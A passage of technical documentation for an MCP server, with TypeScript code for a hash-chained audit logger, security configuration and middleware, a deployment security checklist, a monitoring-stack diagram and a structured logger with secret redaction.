    action: 'suspicious_activity' | 'brute_force_detected' | 'ip_blocked' | 
           'rate_limit_exceeded' | 'injection_attempt' | 'cross_tenant_attempt',
    params: {
      tenantId: string;
      details: Record<string, any>;
      ipAddress?: string;
      requestId: string;
    }
  ): Promise<string> {
    return this.log('security', action, {
      actor: {
        type: 'system',
        id: 'security_monitor',
        tenantId: params.tenantId,
        ipAddress: params.ipAddress
      },
      details: {
        parameters: params.details,
        result: 'failure'
      },
      context: {
        requestId: params.requestId
      },
      severity: 'critical'
    });
  }
  
  /**
   * Query audit logs
   */
  async query(options: AuditQueryOptions): Promise<{
    events: AuditEvent[];
    total: number;
    hasMore: boolean;
  }> {
    const limit = options.limit || 100;
    const offset = options.offset || 0;
    
    // Build query
    let keys: string[] = [];
    
    if (options.tenantId) {
      keys = await this.redis.smembers(
        `${AuditLogger.INDEX_KEY_PREFIX}tenant:${options.tenantId}`
      );
    } else if (options.actorId) {
      keys = await this.redis.smembers(
        `${AuditLogger.INDEX_KEY_PREFIX}actor:${options.actorId}`
      );
    } else {
      // Get all event keys within date range
      keys = await this.getEventKeysInRange(options.startDate, options.endDate);
    }
    
    // Load events
    const pipeline = this.redis.pipeline();
    for (const key of keys) {
      pipeline.get(`${AuditLogger.EVENTS_KEY_PREFIX}${key}`);
    }
    
    const results = await pipeline.exec();
    let events: AuditEvent[] = [];
    
    for (const [error, data] of results || []) {
      if (!error && data) {
        const event: AuditEvent = JSON.parse(data as string);
        
        // Apply filters
        if (this.matchesFilters(event, options)) {
          events.push(event);
        }
      }
    }
    
    // Sort by timestamp descending
    events.sort((a, b) => 
      new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
    );
    
    // Apply pagination
    const total = events.length;
    events = events.slice(offset, offset + limit);
    
    return {
      events,
      total,
      hasMore: offset + limit < total
    };
  }
  
  /**
   * Verify hash chain integrity
   */
  async verifyIntegrity(
    startDate?: Date,
    endDate?: Date
  ): Promise<{
    valid: boolean;
    eventsChecked: number;
    brokenAt?: string;
    details?: string;
  }> {
    if (!this.config.hashChainEnabled) {
      return { valid: true, eventsChecked: 0, details: 'Hash chain disabled' };
    }
    
    const { events } = await this.query({
      startDate,
      endDate,
      limit: 10000
    });
    
    // Sort by timestamp ascending
    events.sort((a, b) => 
      new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime()
    );
    
    let previousHash = '';
    let eventsChecked = 0;
    
    for (const event of events) {
      eventsChecked++;
      
      // Verify previous hash link
      if (event.previousHash !== previousHash) {
        return {
          valid: false,
          eventsChecked,
          brokenAt: event.id,
          details: `Previous hash mismatch at event ${event.id}`
        };
      }
      
      // Verify event hash
      const expectedHash = this.calculateHash(event);
      if (event.hash !== expectedHash) {
        return {
          valid: false,
          eventsChecked,
          brokenAt: event.id,
          details: `Hash verification failed at event ${event.id}`
        };
      }
      
      previousHash = event.hash!;
    }
    
    return {
      valid: true,
      eventsChecked
    };
  }
  
  /**
   * Export audit logs
   */
  async export(
    options: AuditQueryOptions,
    format: 'json' | 'csv'
  ): Promise<string> {
    const { events } = await this.query({ ...options, limit: 100000 });
    
    if (format === 'csv') {
      return this.toCSV(events);
    }
    
    return JSON.stringify(events, null, 2);
  }
  
  // Private helper methods
  
  private async initializeQueue(): Promise<void> {
    this.auditQueue = new Queue('audit-processing', {
      connection: this.redis
    });
  }
  
  private async initializeHashChain(): Promise<void> {
    this.lastHash = await this.redis.get(AuditLogger.HASH_CHAIN_KEY) || '';
  }
  
  private startFlushInterval(): void {
    this.flushInterval = setInterval(
      () => this.flushBuffer(),
      5000 // Flush every 5 seconds
    );
  }
  
  private async flushBuffer(): Promise<void> {
    if (this.eventBuffer.length === 0) return;
    
    const events = [...this.eventBuffer];
    this.eventBuffer = [];
    
    const pipeline = this.redis.pipeline();
    
    for (const event of events) {
      // Store event
      pipeline.set(
        `${AuditLogger.EVENTS_KEY_PREFIX}${event.id}`,
        JSON.stringify(event),
        'EX',
        this.config.retentionDays * 24 * 60 * 60
      );
      
      // Update indices
      pipeline.sadd(
        `${AuditLogger.INDEX_KEY_PREFIX}tenant:${event.actor.tenantId}`,
        event.id
      );
      pipeline.sadd(
        `${AuditLogger.INDEX_KEY_PREFIX}actor:${event.actor.id}`,
        event.id
      );
      pipeline.sadd(
        `${AuditLogger.INDEX_KEY_PREFIX}category:${event.category}`,
        event.id
      );
      
      // Store date index
      const dateKey = event.timestamp.toISOString().split('T')[0];
      pipeline.sadd(
        `${AuditLogger.INDEX_KEY_PREFIX}date:${dateKey}`,
        event.id
      );
    }
    
    // Update hash chain
    if (this.config.hashChainEnabled) {
      pipeline.set(AuditLogger.HASH_CHAIN_KEY, this.lastHash);
    }
    
    await pipeline.exec();
  }
  
  private async storeEvent(event: AuditEvent): Promise<void> {
    this.eventBuffer.push(event);
    await this.flushBuffer();
  }
  
  private generateEventId(): string {
    return `audit-${Date.now()}-${Math.random().toString(36).substring(2, 10)}`;
  }
  
  private calculateHash(event: AuditEvent): string {
    const data = JSON.stringify({
      id: event.id,
      timestamp: event.timestamp,
      category: event.category,
      action: event.action,
      actor: event.actor,
      target: event.target,
      details: event.details,
      context: event.context,
      previousHash: event.previousHash
    });
    
    return createHash('sha256').update(data).digest('hex');
  }
  
  private determineSeverity(
    category: AuditCategory,
    details: AuditEvent['details']
  ): AuditSeverity {
    if (details.result === 'failure') {
      return category === 'security' ? 'critical' : 'warning';
    }
    
    if (category === 'security' || category === 'admin') {
      return 'warning';
    }
    
    return 'info';
  }
  
  private sanitizeActor(actor: AuditEvent['actor']): AuditEvent['actor'] {
    // Remove any sensitive fields from actor
    return {
      ...actor,
      // Mask IP if needed for privacy
      ipAddress: actor.ipAddress // Keep full IP for security auditing
    };
  }
  
  private sanitizeDetails(
    details: AuditEvent['details']
  ): AuditEvent['details'] {
    const sanitized = { ...details };
    
    // Sanitize parameters
    if (sanitized.parameters) {
      sanitized.parameters = this.sanitizeObject(sanitized.parameters);
    }
    
    // Sanitize changes
    if (sanitized.changes) {
      sanitized.changes = sanitized.changes.map(change => ({
        ...change,
        oldValue: this.sanitizeValue(change.field, change.oldValue),
        newValue: this.sanitizeValue(change.field, change.newValue)
      }));
    }
    
    return sanitized;
  }
  
  private sanitizeObject(obj: Record<string, any>): Record<string, any> {
    const sanitized: Record<string, any> = {};
    
    for (const [key, value] of Object.entries(obj)) {
      sanitized[key] = this.sanitizeValue(key, value);
    }
    
    return sanitized;
  }
  
  private sanitizeValue(key: string, value: any): any {
    const lowerKey = key.toLowerCase();
    
    // Check if field is sensitive
    for (const sensitiveField of this.config.sensitiveFields) {
      if (lowerKey.includes(sensitiveField.toLowerCase())) {
        return '[REDACTED]';
      }
    }
    
    // Recursively sanitize nested objects
    if (typeof value === 'object' && value !== null && !Array.isArray(value)) {
      return this.sanitizeObject(value);
    }
    
    return value;
  }
  
  private matchesFilters(
    event: AuditEvent,
    options: AuditQueryOptions
  ): boolean {
    if (options.category && event.category !== options.category) return false;
    if (options.action && event.action !== options.action) return false;
    if (options.severity && event.severity !== options.severity) return false;
    if (options.targetType && event.target?.type !== options.targetType) return false;
    if (options.targetId && event.target?.id !== options.targetId) return false;
    if (options.result && event.details.result !== options.result) return false;
    
    if (options.startDate && new Date(event.timestamp) < options.startDate) return false;
    if (options.endDate && new Date(event.timestamp) > options.endDate) return false;
    
    return true;
  }
  
  private async getEventKeysInRange(
    startDate?: Date,
    endDate?: Date
  ): Promise<string[]> {
    const keys: string[] = [];
    const start = startDate || new Date(Date.now() - 30 * 24 * 60 * 60 * 1000);
    const end = endDate || new Date();
    
    const current = new Date(start);
    while (current <= end) {
      const dateKey = current.toISOString().split('T')[0];
      const dayKeys = await this.redis.smembers(
        `${AuditLogger.INDEX_KEY_PREFIX}date:${dateKey}`
      );
      keys.push(...dayKeys);
      current.setDate(current.getDate() + 1);
    }
    
    return keys;
  }
  
  private toCSV(events: AuditEvent[]): string {
    const headers = [
      'ID', 'Timestamp', 'Category', 'Action', 'Severity',
      'Actor Type', 'Actor ID', 'Tenant ID',
      'Target Type', 'Target ID',
      'Result', 'Request ID'
    ];
    
    const rows = events.map(e => [
      e.id,
      e.timestamp,
      e.category,
      e.action,
      e.severity,
      e.actor.type,
      e.actor.id,
      e.actor.tenantId,
      e.target?.type || '',
      e.target?.id || '',
      e.details.result || '',
      e.context.requestId
    ].map(v => `"${String(v).replace(/"/g, '""')}"`).join(','));
    
    return [headers.join(','), ...rows].join('\n');
  }
  
  /**
   * Cleanup resources
   */
  async shutdown(): Promise<void> {
    if (this.flushInterval) {
      clearInterval(this.flushInterval);
    }
    
    await this.flushBuffer();
    await this.auditQueue?.close();
  }
}
```

### 8.7 Security Best Practices

Security best practices and guidelines for MCP server implementation.

#### 8.7.1 Security Configuration

```typescript
// src/workers/L/security/security-config.ts

/**
 * Security hardening configuration
 */
export const SECURITY_CONFIG = {
  // Authentication settings
  authentication: {
    sessionTimeout: 30 * 60 * 1000, // 30 minutes
    maxSessionsPerUser: 5,
    tokenExpiration: {
      access: 15 * 60, // 15 minutes
      refresh: 7 * 24 * 60 * 60 // 7 days
    },
    passwordPolicy: {
      minLength: 12,
      requireUppercase: true,
      requireLowercase: true,
      requireNumbers: true,
      requireSpecial: true,
      maxAge: 90, // days
      preventReuse: 5 // last N passwords
    },
    mfa: {
      required: ['admin', 'supervisor'],
      methods: ['totp', 'sms', 'email'],
      backupCodes: 10
    },
    bruteForce: {
      maxAttempts: 5,
      lockoutDuration: 15 * 60 * 1000, // 15 minutes
      progressiveDelay: true
    }
  },
  
  // Authorization settings
  authorization: {
    defaultDeny: true,
    permissionCaching: 300, // 5 minutes
    roleHierarchy: {
      'admin': ['supervisor', 'agent', 'viewer'],
      'supervisor': ['agent', 'viewer'],
      'agent': ['viewer'],
      'viewer': []
    }
  },
  
  // Encryption settings
  encryption: {
    algorithm: 'aes-256-gcm',
    keyRotationDays: 30,
    dataAtRest: true,
    dataInTransit: true,
    tlsVersion: '1.3'
  },
  
  // Rate limiting
  rateLimiting: {
    global: {
      windowMs: 60 * 1000,
      maxRequests: 1000
    },
    perUser: {
      windowMs: 60 * 1000,
      maxRequests: 100
    },
    perEndpoint: {
      '/api/auth/login': { windowMs: 60 * 1000, maxRequests: 5 },
      '/api/tools/execute': { windowMs: 60 * 1000, maxRequests: 30 },
      '/api/resources/load': { windowMs: 60 * 1000, maxRequests: 50 }
    }
  },
  
  // Input validation
  validation: {
    maxRequestSize: 10 * 1024 * 1024, // 10MB
    maxStringLength: 100000,
    maxArrayLength: 10000,
    maxObjectDepth: 10,
    sanitizeHtml: true,
    stripNullBytes: true,
    encoding: 'utf-8'
  },
  
  // Headers configuration
  headers: {
    security: {
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'X-XSS-Protection': '1; mode=block',
      'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
      'Content-Security-Policy': "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'",
      'Referrer-Policy': 'strict-origin-when-cross-origin',
      'Permissions-Policy': 'geolocation=(), microphone=(), camera=()'
    },
    cors: {
      origin: process.env.ALLOWED_ORIGINS?.split(',') || ['https://app.cerniq.ro'],
      methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
      allowedHeaders: ['Content-Type', 'Authorization', 'X-Request-ID'],
      exposedHeaders: ['X-Request-ID', 'X-RateLimit-Remaining'],
      credentials: true,
      maxAge: 86400
    }
  },
  
  // Audit settings
  audit: {
    enabled: true,
    categories: ['authentication', 'authorization', 'data_modification', 'security'],
    retentionDays: 365,
    hashChain: true,
    realTimeAlerts: ['security', 'authentication_failure']
  },
  
  // Error handling
  errors: {
    exposeStackTrace: false,
    exposeErrorCodes: true,
    genericMessages: true,
    logAllErrors: true
  },
  
  // Session management
  sessions: {
    secure: true,
    httpOnly: true,
    sameSite: 'strict',
    domain: process.env.SESSION_DOMAIN || '.cerniq.ro',
    name: '__cerniq_session',
    regenerateOnAuth: true
  }
} as const;

/**
 * Security middleware factory
 */
export function createSecurityMiddleware() {
  return {
    // Apply security headers
    securityHeaders: (req: any, res: any, next: any) => {
      for (const [header, value] of Object.entries(SECURITY_CONFIG.headers.security)) {
        res.setHeader(header, value);
      }
      next();
    },
    
    // Request validation
    validateRequest: (req: any, res: any, next: any) => {
      // Check request size
      const contentLength = parseInt(req.headers['content-length'] || '0');
      if (contentLength > SECURITY_CONFIG.validation.maxRequestSize) {
        return res.status(413).json({ error: 'Request too large' });
      }
      
      // Check content type
      if (req.method !== 'GET' && !req.is('application/json')) {
        return res.status(415).json({ error: 'Unsupported content type' });
      }
      
      next();
    },
    
    // Sanitize input
    sanitizeInput: (req: any, res: any, next: any) => {
      if (req.body) {
        req.body = sanitizeObject(req.body);
      }
      if (req.query) {
        req.query = sanitizeObject(req.query);
      }
      next();
    }
  };
}

/**
 * Sanitize object recursively
 */
function sanitizeObject(obj: any, depth: number = 0): any {
  if (depth > SECURITY_CONFIG.validation.maxObjectDepth) {
    return null;
  }
  
  if (obj === null || obj === undefined) {
    return obj;
  }
  
  if (typeof obj === 'string') {
    // Strip null bytes
    let sanitized = obj.replace(/\0/g, '');
    
    // Limit string length
    if (sanitized.length > SECURITY_CONFIG.validation.maxStringLength) {
      sanitized = sanitized.substring(0, SECURITY_CONFIG.validation.maxStringLength);
    }
    
    return sanitized;
  }
  
  if (Array.isArray(obj)) {
    // Limit array length
    const limited = obj.slice(0, SECURITY_CONFIG.validation.maxArrayLength);
    return limited.map(item => sanitizeObject(item, depth + 1));
  }
  
  if (typeof obj === 'object') {
    const sanitized: Record<string, any> = {};
    for (const [key, value] of Object.entries(obj)) {
      // Skip prototype pollution attempts
      if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
        continue;
      }
      sanitized[key] = sanitizeObject(value, depth + 1);
    }
    return sanitized;
  }
  
  return obj;
}
```

#### 8.7.2 Security Checklist

```typescript
// src/workers/L/security/security-checklist.ts

/**
 * Security checklist for MCP server deployment
 */
export const SECURITY_CHECKLIST = {
  infrastructure: {
    title: 'Infrastructure Security',
    items: [
      { id: 'infra-1', check: 'TLS 1.3 enabled for all connections', critical: true },
      { id: 'infra-2', check: 'Database connections encrypted', critical: true },
      { id: 'infra-3', check: 'Redis connections authenticated and encrypted', critical: true },
      { id: 'infra-4', check: 'Private network for internal services', critical: true },
      { id: 'infra-5', check: 'Firewall rules configured (only 443 exposed)', critical: true },
      { id: 'infra-6', check: 'DDoS protection enabled', critical: false },
      { id: 'infra-7', check: 'Regular security patches applied', critical: true },
      { id: 'infra-8', check: 'Intrusion detection system active', critical: false }
    ]
  },
  
  authentication: {
    title: 'Authentication Security',
    items: [
      { id: 'auth-1', check: 'Strong password policy enforced', critical: true },
      { id: 'auth-2', check: 'MFA enabled for admin accounts', critical: true },
      { id: 'auth-3', check: 'Session timeout configured', critical: true },
      { id: 'auth-4', check: 'Account lockout after failed attempts', critical: true },
      { id: 'auth-5', check: 'Secure session storage', critical: true },
      { id: 'auth-6', check: 'Token rotation implemented', critical: false },
      { id: 'auth-7', check: 'Credential storage using bcrypt/argon2', critical: true },
      { id: 'auth-8', check: 'Session regeneration on auth', critical: true }
    ]
  },
  
  authorization: {
    title: 'Authorization Security',
    items: [
      { id: 'authz-1', check: 'Role-based access control implemented', critical: true },
      { id: 'authz-2', check: 'Principle of least privilege applied', critical: true },
      { id: 'authz-3', check: 'Resource-level permissions', critical: true },
      { id: 'authz-4', check: 'Tenant isolation enforced', critical: true },
      { id: 'authz-5', check: 'Permission caching with proper invalidation', critical: false },
      { id: 'authz-6', check: 'Default deny policy', critical: true }
    ]
  },
  
  dataProtection: {
    title: 'Data Protection',
    items: [
      { id: 'data-1', check: 'Sensitive data encrypted at rest', critical: true },
      { id: 'data-2', check: 'Data encrypted in transit', critical: true },
      { id: 'data-3', check: 'PII handling compliant with GDPR', critical: true },
      { id: 'data-4', check: 'Key rotation schedule defined', critical: true },
      { id: 'data-5', check: 'Secure key storage (HSM/KMS)', critical: true },
      { id: 'data-6', check: 'Data masking for logs', critical: true },
      { id: 'data-7', check: 'Backup encryption enabled', critical: true },
      { id: 'data-8', check: 'Data retention policy implemented', critical: false }
    ]
  },
  
  inputValidation: {
    title: 'Input Validation',
    items: [
      { id: 'input-1', check: 'All input validated server-side', critical: true },
      { id: 'input-2', check: 'SQL injection prevention', critical: true },
      { id: 'input-3', check: 'XSS prevention', critical: true },
      { id: 'input-4', check: 'Request size limits', critical: true },
      { id: 'input-5', check: 'Content-Type validation', critical: true },
      { id: 'input-6', check: 'File upload restrictions', critical: true },
      { id: 'input-7', check: 'JSON schema validation', critical: false },
      { id: 'input-8', check: 'Prototype pollution prevention', critical: true }
    ]
  },
  
  monitoring: {
    title: 'Security Monitoring',
    items: [
      { id: 'mon-1', check: 'Audit logging enabled', critical: true },
      { id: 'mon-2', check: 'Security event alerting', critical: true },
      { id: 'mon-3', check: 'Log integrity protection (hash chain)', critical: false },
      { id: 'mon-4', check: 'Real-time monitoring active', critical: true },
      { id: 'mon-5', check: 'Anomaly detection configured', critical: false },
      { id: 'mon-6', check: 'Log retention compliance', critical: true },
      { id: 'mon-7', check: 'Incident response plan documented', critical: true }
    ]
  },
  
  apiSecurity: {
    title: 'API Security',
    items: [
      { id: 'api-1', check: 'Rate limiting implemented', critical: true },
      { id: 'api-2', check: 'CORS properly configured', critical: true },
      { id: 'api-3', check: 'Security headers set', critical: true },
      { id: 'api-4', check: 'API versioning', critical: false },
      { id: 'api-5', check: 'Error messages sanitized', critical: true },
      { id: 'api-6', check: 'Request ID tracking', critical: true },
      { id: 'api-7', check: 'API documentation access controlled', critical: false }
    ]
  },
  
  toolSecurity: {
    title: 'MCP Tool Security',
    items: [
      { id: 'tool-1', check: 'Tool access policies defined', critical: true },
      { id: 'tool-2', check: 'Parameter validation for all tools', critical: true },
      { id: 'tool-3', check: 'Tool execution sandboxing', critical: true },
      { id: 'tool-4', check: 'Tool execution logging', critical: true },
      { id: 'tool-5', check: 'Resource quotas per tool', critical: false },
      { id: 'tool-6', check: 'Tool timeout enforcement', critical: true },
      { id: 'tool-7', check: 'Sensitive tool requires confirmation', critical: true }
    ]
  }
};

/**
 * Run security checklist verification
 */
export async function verifySecurityChecklist(
  config: any,
  testFunctions?: Record<string, () => Promise<boolean>>
): Promise<{
  passed: boolean;
  score: number;
  criticalIssues: string[];
  warnings: string[];
  details: Record<string, { passed: boolean; items: Array<{ id: string; passed: boolean }> }>;
}> {
  const criticalIssues: string[] = [];
  const warnings: string[] = [];
  const details: Record<string, any> = {};
  
  let totalChecks = 0;
  let passedChecks = 0;
  
  for (const [section, sectionData] of Object.entries(SECURITY_CHECKLIST)) {
    const sectionResults: Array<{ id: string; passed: boolean }> = [];
    
    for (const item of sectionData.items) {
      totalChecks++;
      
      // Run test if available
      let passed = false;
      if (testFunctions?.[item.id]) {
        try {
          passed = await testFunctions[item.id]();
        } catch {
          passed = false;
        }
      }
      
      if (passed) {
        passedChecks++;
      } else {
        if (item.critical) {
          criticalIssues.push(`[${item.id}] ${item.check}`);
        } else {
          warnings.push(`[${item.id}] ${item.check}`);
        }
      }
      
      sectionResults.push({ id: item.id, passed });
    }
    
    details[section] = {
      passed: sectionResults.every(r => r.passed),
      items: sectionResults
    };
  }
  
  return {
    passed: criticalIssues.length === 0,
    score: Math.round((passedChecks / totalChecks) * 100),
    criticalIssues,
    warnings,
    details
  };
}
```

---

## 9. Monitoring & Debugging

### 9.1 Monitoring Overview

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        MCP SERVER MONITORING STACK                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │                         VISUALIZATION LAYER                          │   │
│  │  ┌──────────────┐ ┌──────────────┐ ┌──────────────┐ ┌────────────┐  │   │
│  │  │   Grafana    │ │   SigNoz     │ │   Kibana     │ │  Alerts    │  │   │
│  │  │  Dashboards  │ │   Traces     │ │    Logs      │ │  Manager   │  │   │
│  │  └──────────────┘ └──────────────┘ └──────────────┘ └────────────┘  │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                    ▲                                        │
│  ┌─────────────────────────────────┼───────────────────────────────────┐   │
│  │                    DATA COLLECTION LAYER                             │   │
│  │  ┌──────────────┐ ┌─────────────┴──────┐ ┌──────────────────────┐   │   │
│  │  │  Prometheus  │ │  OpenTelemetry     │ │    Fluentd/Vector    │   │   │
│  │  │   Metrics    │ │  Collector         │ │    Log Aggregator    │   │   │
│  │  └──────────────┘ └────────────────────┘ └──────────────────────┘   │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                    ▲                                        │
│  ┌─────────────────────────────────┼───────────────────────────────────┐   │
│  │                    INSTRUMENTATION LAYER                             │   │
│  │  ┌──────────────┐ ┌─────────────┴──────┐ ┌──────────────────────┐   │   │
│  │  │   Metrics    │ │     Tracing        │ │      Logging         │   │   │
│  │  │   Exporters  │ │  Instrumentation   │ │    Structured        │   │   │
│  │  └──────────────┘ └────────────────────┘ └──────────────────────┘   │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                    ▲                                        │
│  ┌─────────────────────────────────┼───────────────────────────────────┐   │
│  │                         MCP SERVER LAYER                             │   │
│  │  ┌──────────────────────────────┴──────────────────────────────┐    │   │
│  │  │                       L1/L2/L3 Workers                       │    │   │
│  │  │  ┌─────────┐ ┌─────────┐ ┌─────────┐ ┌─────────┐            │    │   │
│  │  │  │Protocol │ │Resource │ │  Tool   │ │ Session │            │    │   │
│  │  │  │Handler  │ │Manager  │ │Executor │ │Manager  │            │    │   │
│  │  │  └─────────┘ └─────────┘ └─────────┘ └─────────┘            │    │   │
│  │  └─────────────────────────────────────────────────────────────┘    │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 9.2 Structured Logging

#### 9.2.1 Logger Implementation

```typescript
// src/workers/L/monitoring/structured-logger.ts
import pino, { Logger as PinoLogger, LoggerOptions } from 'pino';
import { EventEmitter } from 'events';

/**
 * Log levels
 */
type LogLevel = 'trace' | 'debug' | 'info' | 'warn' | 'error' | 'fatal';

/**
 * Log context
 */
interface LogContext {
  requestId?: string;
  sessionId?: string;
  tenantId?: string;
  userId?: string;
  conversationId?: string;
  correlationId?: string;
  component?: string;
  operation?: string;
  [key: string]: any;
}

/**
 * Log entry
 */
interface LogEntry {
  level: LogLevel;
  message: string;
  timestamp: string;
  context: LogContext;
  data?: any;
  error?: {
    name: string;
    message: string;
    stack?: string;
    code?: string;
  };
  duration?: number;
  metrics?: Record<string, number>;
}

/**
 * Logger configuration
 */
interface LoggerConfig {
  level: LogLevel;
  pretty: boolean;
  redactPaths: string[];
  outputStream?: NodeJS.WritableStream;
  hooks?: {
    onLog?: (entry: LogEntry) => void;
    onError?: (entry: LogEntry) => void;
  };
}

/**
 * Default redaction paths
 */
const DEFAULT_REDACT_PATHS = [
  'password',
  'token',
  'secret',
  'apiKey',
  'authorization',
  'cookie',
  'creditCard',
  '*.password',
  '*.token',
  '*.secret',
  '*.apiKey',
  'headers.authorization',
  'headers.cookie'
];

/**
 * Structured Logger for MCP Server
 */
export class MCPLogger extends EventEmitter {
  private pino: PinoLogger;
  private config: LoggerConfig;
  private context: LogContext;
  
  constructor(config?: Partial<LoggerConfig>, context?: LogContext) {
    super();
    
    this.config = {
      level: (process.env.LOG_LEVEL as LogLevel) || 'info',
      pretty: process.env.NODE_ENV !== 'production',
      redactPaths: DEFAULT_REDACT_PATHS,
      ...config
    };
    
    this.context = context || {};
    
    const pinoOptions: LoggerOptions = {
      level: this.config.level,
      redact: {
        paths: this.config.redactPaths,
        censor: '[REDACTED]'
      },
      timestamp: pino.stdTimeFunctions.isoTime,
      formatters: {
        level: (label) => ({ level: label }),
        log: (object) => this.formatLog(object)
      },
      serializers: {
        error: pino.stdSerializers.err,
        req: pino.stdSerializers.req,
        res: pino.stdSerializers.res
      }
    };
    
    if (this.config.pretty) {
      pinoOptions.transport = {
        target: 'pino-pretty',
        options: {
          colorize: true,
          translateTime: 'SYS:standard',
          ignore: 'pid,hostname'
        }
      };
    }
    
    this.pino = pino(pinoOptions, this.config.outputStream);
  }
  
  /**
   * Create child logger with additional context
   */
  child(context: LogContext): MCPLogger {
    const childLogger = new MCPLogger(this.config, {
      ...this.context,
      ...context
    });
    
    // Forward events
    childLogger.on('log', (entry) => this.emit('log', entry));
    childLogger.on('error', (entry) => this.emit('error', entry));
    
    return childLogger;
  }
  
  /**
   * Log at trace level
   */
  trace(message: string, data?: any): void {
    this.log('trace', message, data);
  }
  
  /**
   * Log at debug level
   */
  debug(message: string, data?: any): void {
    this.log('debug', message, data);
  }
  
  /**
   * Log at info level
   */
  info(message: string, data?: any): void {
    this.log('info', message, data);
  }
  
  /**
   * Log at warn level
   */
  warn(message: string, data?: any): void {
    this.log('warn', message, data);
  }
  
  /**
   * Log at error level
   */
  error(message: string, error?: Error | any, data?: any): void {
    const errorData = error instanceof Error ? {
      error: {
        name: error.name,
        message: error.message,
        stack: error.stack,
        code: (error as any).code
      }
    } : { error };
    
    this.log('error', message, { ...errorData, ...data });
    
    // Emit error event
    const entry = this.createEntry('error', message, { ...errorData, ...data });
    this.emit('error', entry);
    this.config.hooks?.onError?.(entry);
  }
  
  /**
   * Log at fatal level
   */
  fatal(message: string, error?: Error | any, data?: any): void {
    const errorData = error instanceof Error ? {
      error: {
        name: error.name,
        message: error.message,
        stack: error.stack,
        code: (error as any).code
      }
    } : { error };
    
    this.log('fatal', message, { ...errorData, ...data });
  }
  
  /**
   * Log with timing
   */
  timed<T>(operation: string, fn: () => T): T {
    const start = process.hrtime.bigint();
    try {
      const result = fn();
      
      if (result instanceof Promise) {
        return result.then((res) => {
          const duration = this.calculateDuration(start);
          this.info(`${operation} completed`, { duration, operation });
          return res;
        }).catch((err) => {
          const duration = this.calculateDuration(start);
          this.error(`${operation} failed`, err, { duration, operation });
          throw err;
        }) as T;
      }
      
      const duration = this.calculateDuration(start);
      this.info(`${operation} completed`, { duration, operation });
      return result;
    } catch (err) {
      const duration = this.calculateDuration(start);
      this.error(`${operation} failed`, err as Error, { duration, operation });
      throw err;
    }
  }
  
  /**
   * Create timer for manual timing
   */
  startTimer(operation: string): { end: (data?: any) => void; fail: (error: Error, data?: any) => void } {
    const start = process.hrtime.bigint();
    
    return {
      end: (data?: any) => {
        const duration = this.calculateDuration(start);
        this.info(`${operation} completed`, { ...data, duration, operation });
      },
      fail: (error: Error, data?: any) => {
        const duration = this.calculateDuration(start);
        this.error(`${operation} failed`, error, { ...data, duration, operation });
      }
    };
  }
  
  /**
   * Log request/response
   */
  logRequest(req: {
    method: string;
    path: string;
    headers?: Record<string, string>;
    body?: any;
    query?: Record<string, string>;
  }): void {
    this.info('Incoming request', {
      request: {
        method: req.method,
        path: req.path,
        query: req.query,
        contentLength: req.headers?.['content-length']
      }
    });
  }
  
  logResponse(res: {
    statusCode: number;
    duration: number;
    size?: number;
  }): void {
    const level: LogLevel = res.statusCode >= 500 ? 'error' :
                           res.statusCode >= 400 ? 'warn' : 'info';
    
    this.log(level, 'Response sent', {
      response: {
        statusCode: res.statusCode,
        duration: res.duration,
        size: res.size
      }
    });
  }
  
  /**
   * Log MCP operations
   */
  logToolExecution(params: {
    tool: string;
    parameters: any;
    result?: any;
    error?: Error;
    duration: number;
  }): void {
    if (params.error) {
      this.error(`Tool execution failed: ${params.tool}`, params.error, {
        tool: params.tool,
        duration: params.duration
      });
    } else {
      this.info(`Tool executed: ${params.tool}`, {
        tool: params.tool,
        duration: params.duration,
        resultSize: JSON.stringify(params.result || {}).length
      });
    }
  }
  
  logResourceAccess(params: {
    uri: string;
    operation: 'read' | 'list' | 'subscribe';
    cached: boolean;
    duration: number;
    size?: number;
  }): void {
    this.debug(`Resource accessed: ${params.uri}`, {
      resource: params.uri,
      operation: params.operation,
      cached: params.cached,
      duration: params.duration,
      size: params.size
    });
  }
  
  logSessionEvent(params: {
    event: 'created' | 'updated' | 'expired' | 'terminated';
    sessionId: string;
    reason?: string;
  }): void {
    this.info(`Session ${params.event}`, {
      session: {
        id: params.sessionId,
        event: params.event,
        reason: params.reason
      }
    });
  }
  
  // Private methods
  
  private log(level: LogLevel, message: string, data?: any): void {
    const entry = this.createEntry(level, message, data);
    
    this.pino[level]({
      ...entry.context,
      ...data
    }, message);
    
    // Emit log event
    this.emit('log', entry);
    this.config.hooks?.onLog?.(entry);
  }
  
  private createEntry(level: LogLevel, message: string, data?: any): LogEntry {
    return {
      level,
      message,
      timestamp: new Date().toISOString(),
      context: this.context,
      data,
      error: data?.error,
      duration: data?.duration,
      metrics: data?.metrics
    };
  }
  
  private formatLog(object: any): any {
    // Add standard fields
    return {
      ...object,
      service: 'mcp-server',
      version: process.env.npm_package_version || '1.0.0',
      environment: process.env.NODE_ENV || 'development'
    };
  }
  
  private calculateDuration(start: bigint): number {
    return Number(process.hrtime.bigint() - start) / 1_000_000; // ms
  }
}

/**
 * Create logger with request context
 */
export function createRequestLogger(
  baseLogger: MCPLogger,
  req: { requestId: string; tenantId?: string; userId?: string }
): MCPLogger {
  return baseLogger.child({
    requestId: req.requestId,
    tenantId: req.tenantId,
    userId: req.userId
  });
}
```

### 9.3 Distributed Tracing

```typescript
// src/workers/L/monitoring/tracing.ts
import { 
  trace, 
  Span, 
  SpanKind, 
  SpanStatusCode, 
  context,
  propagation,
  Tracer,
  Context
} from '@opentelemetry/api';
import { Resource } from '@opentelemetry/resources';
import { SemanticResourceAttributes } from '@opentelemetry/semantic-conventions';
import { NodeTracerProvider } from '@opentelemetry/sdk-trace-node';
import { BatchSpanProcessor } from '@opentelemetry/sdk-trace-base';
